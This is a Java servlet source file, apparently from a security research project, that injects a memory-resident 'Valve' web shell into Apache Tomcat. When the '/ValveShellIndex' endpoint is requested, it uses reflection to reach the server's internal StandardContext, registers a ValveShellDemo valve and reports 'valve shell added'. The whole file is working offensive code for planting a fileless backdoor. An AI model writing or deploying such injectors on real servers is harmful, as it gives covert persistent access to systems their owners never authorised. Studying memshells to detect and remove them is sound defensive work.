package cc.saferoad.servlet.valvememshell;/*
@auther S0cke3t
@date 2021-12-29
*/

import org.apache.catalina.Valve;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;

import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.annotation.*;
import java.io.IOException;
import java.lang.reflect.Field;

@WebServlet(name = "ValveShellIndex", value = "/ValveShellIndex")
public class ValveShellIndex extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        doPost(request,response);
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        try{
            ServletContext servletContext = request.getServletContext();
            StandardContext standardContext;
            Field applicationContextField = servletContext.getClass().getDeclaredField("context");
            applicationContextField.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext)applicationContextField.get(servletContext);

            Field standContextField = applicationContext.getClass().getDeclaredField("context");
            standContextField.setAccessible(true);
            standardContext = (StandardContext)standContextField.get(applicationContext);
            Class<?> valveShellClass = cc.saferoad.servlet.valvememshell.ValveShellDemo.class;
            standardContext.addValve((Valve) valveShellClass.newInstance());
            response.getWriter().println("valve shell added");
        }
        catch(Exception e){
            e.printStackTrace();
        }
    }
}
